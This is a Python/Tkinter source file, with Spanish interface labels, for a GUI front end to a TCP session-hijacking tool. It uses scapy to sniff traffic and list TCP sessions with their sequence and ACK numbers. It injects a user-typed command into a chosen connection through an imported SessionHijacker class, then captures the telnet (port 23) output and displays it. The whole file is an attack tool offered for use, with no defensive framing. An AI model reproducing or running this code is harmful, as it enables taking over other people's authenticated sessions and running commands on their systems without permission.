import tkinter as tk
from tkinter import Listbox
from scapy.all import IP, TCP, send, sniff, Raw
import threading
from sniffer import SessionHijacker
import re


class App:
    def __init__(self, root):
        self.root = root
        self.root.title("Session Hijacker GUI")
        
        self.hijacker = SessionHijacker()
        self.packet_dict = {}
        
        # Campo de texto para el filtro de IP
        tk.Label(root, text="Filtrar por IP:").grid(row=0, column=0)
        self.filter_ip = tk.Entry(root)
        self.filter_ip.grid(row=0, column=1)
        self.filter_button = tk.Button(root, text="Aplicar filtro", command=self.apply_filter)
        self.filter_button.grid(row=0, column=2)

        # Lista para mostrar los paquetes esnifados
        self.packet_list = Listbox(root, width=80, height=10)
        self.packet_list.grid(row=1, column=0, columnspan=3)
        self.packet_list.bind('<Double-1>', self.fill_fields)
        
        # Checkbox para especificar si el origen es el cliente o el servidor
        self.isServer = tk.IntVar()
        tk.Checkbutton(root, text="Origen: Servidor", variable=self.isServer).grid(row=1, column=3)


        # Campos de entrada y etiquetas
        fields = ["IP origen", "IP destino", "Puerto origen", "Puerto destino", "Número de secuencia actual", "ACK actual", "Comando"]
        self.entries = {}
        row = 2
        for field in fields:
            tk.Label(root, text=field+":").grid(row=row, column=0)
            entry = tk.Entry(root)
            entry.grid(row=row, column=1)
            self.entries[field] = entry
            row += 1

        # Botón para inyectar el comando
        self.inject_button = tk.Button(root, text="Inyectar", command=self.inject_command)
        self.inject_button.grid(row=row, column=1)

        # Iniciar la captura de paquetes en un hilo separado
        thread = threading.Thread(target=self.sniff_packets)
        thread.daemon = True  # Marcar el hilo como demonio para que termine con el programa
        thread.start()

    def sniff_packets(self):
        sniff(prn=self.process_packet, store=0)

    def process_packet(self, packet):
        if packet.haslayer(IP) and packet.haslayer(TCP):
            packet_summary = f"{packet[IP].src} -> {packet[IP].dst} | {packet[TCP].sport} -> {packet[TCP].dport} | Seq: {packet[TCP].seq} | Ack: {packet[TCP].ack}"
            self.packet_dict[packet_summary] = packet  # Almacenar el paquete con su resumen como clave
            if self.filter_ip.get() in packet_summary:
                self.packet_list.insert(tk.END, packet_summary)

    def apply_filter(self):
        self.packet_list.delete(0, tk.END)  # Limpiar la lista actual
        filter_ip = self.filter_ip.get()
        for summary in self.packet_dict.keys():
            if filter_ip in summary:
                self.packet_list.insert(tk.END, summary)

    def fill_fields(self, event):
        selected_summary = self.packet_list.get(self.packet_list.curselection())
        packet = self.packet_dict[selected_summary] 

        # Rellenar los campos automáticamente
        self.entries["IP origen"].delete(0, tk.END)
        self.entries["IP origen"].insert(0, packet[IP].src)
        self.entries["IP destino"].delete(0, tk.END)
        self.entries["IP destino"].insert(0, packet[IP].dst)
        self.entries["Puerto origen"].delete(0, tk.END)
        self.entries["Puerto origen"].insert(0, packet[TCP].sport)
        self.entries["Puerto destino"].delete(0, tk.END)
        self.entries["Puerto destino"].insert(0, packet[TCP].dport)
        self.entries["Número de secuencia actual"].delete(0, tk.END)
        self.entries["Número de secuencia actual"].insert(0, packet[TCP].seq)
        self.entries["ACK actual"].delete(0, tk.END)
        self.entries["ACK actual"].insert(0, packet[TCP].ack)

    def inject_command(self):
        threading.Thread(target=self.sniff_results).start()

        selected_summary = self.packet_list.get(self.packet_list.curselection())
        packet = self.packet_dict[selected_summary] 
        command = self.entries["Comando"].get()
        self.hijacker.inject_command(packet=packet, command=command)

    def sniff_results(self):
        filter = f"tcp and port {self.entries['Puerto origen'].get()} and port 23"
        sniff(prn=self.result_window, filter=filter, store=0)

    def result_window(self, packet):
        result_root = tk.Tk()
        result_root.title("Resultados encontrados")
        result_text = tk.Text(result_root, width=80, height=10)
        result_text.pack()

        raw_text = packet[Raw].load.decode()
        clean_text = re.sub(r'\[\d+;\d+H', '', raw_text)
        clean_text = re.sub(r'(\d{2}/\d{2}/\d{4}  \d{2}:\d{2}[pa])', r'\n\1', clean_text)
        clean_text = re.sub(r'(0 File\(s\))', r'\n\1', clean_text)
        clean_text = re.sub(r'(\d+ Dir\(s\))', r'\n\1', clean_text)
        clean_text = clean_text.replace('C:\\>', '').strip()

        result_text.insert(tk.END, clean_text)
        result_root.mainloop()

if __name__ == "__main__":
    root = tk.Tk()
    app = App(root)
    root.mainloop()

